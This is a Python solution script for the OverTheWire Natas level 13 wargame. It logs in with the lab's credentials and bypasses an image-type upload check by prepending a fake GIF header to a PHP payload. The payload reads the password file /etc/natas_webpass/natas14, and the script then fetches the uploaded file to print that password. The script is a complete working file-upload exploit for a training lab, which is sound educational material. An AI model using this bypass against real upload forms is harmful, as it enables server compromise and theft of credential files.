# Natas13 python solution
# By Emil 'Dota' Bak, 2019

import requests
from bs4 import BeautifulSoup

# ***********************************************
URL = "http://natas13.natas.labs.overthewire.org/"

auth_name = 'natas13'
auth_pass = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# Unlike the prior challenge, this one checks (via 'exif_imagetype'), if
# the uploaded file matches the header signature of several image files.

# To get around this, the user can fake a GIF header
gif_bytes = [0x47, 0x49, 0x46]

gif_header = ''.join(map(lambda x: chr(x), gif_bytes)) # for you lambda lovers

# The PHP script to upload
php_payload = r'''<?php
    include("/etc/natas_webpass/natas14");
?>'''

FILE = dict(uploadedfile=(('hacky.php', gif_header + '\n' + php_payload)))
DATA = dict(filename='renamed.php')

r = s.post(URL, auth=(auth_name, auth_pass), files=FILE, data=DATA)

# The HTML is parsed to extract the link provided.
soup = BeautifulSoup(r.text, 'html.parser')
LINK = (soup.find_all('a')[0].get('href'))


r = s.get(URL+LINK, auth=(auth_name, auth_pass))
print (r.text)